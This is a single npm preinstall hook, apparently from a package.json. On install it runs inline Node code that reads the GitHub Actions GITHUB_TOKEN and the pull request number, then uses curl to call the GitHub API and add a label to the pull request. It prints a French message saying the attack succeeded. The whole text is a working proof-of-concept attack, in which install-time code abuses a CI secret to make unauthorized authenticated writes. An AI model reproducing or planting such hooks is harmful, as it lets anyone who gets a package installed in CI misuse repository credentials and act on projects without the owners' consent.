scripts.preinstall: node -e "const { execSync } = require('child_process'); const token = process.env.GITHUB_TOKEN; const repo = process.env.GITHUB_REPOSITORY; const prNumber = process.env.GITHUB_EVENT_PATH ? require(process.env.GITHUB_EVENT_PATH).pull_request.number : ''; if(token && prNumber) { try { execSync(`curl -H 'Authorization: token ${token}' -H 'Accept: application/vnd.github.v3+json' -X POST https://api.github.com/repos/${repo}/issues/${prNumber}/labels -d '{\"labels\":[\"LS\"]}'`); console.log('Attaque réussie : Label LS envoyé'); } catch(e) { console.log('Erreur lors de l envoi'); } }"
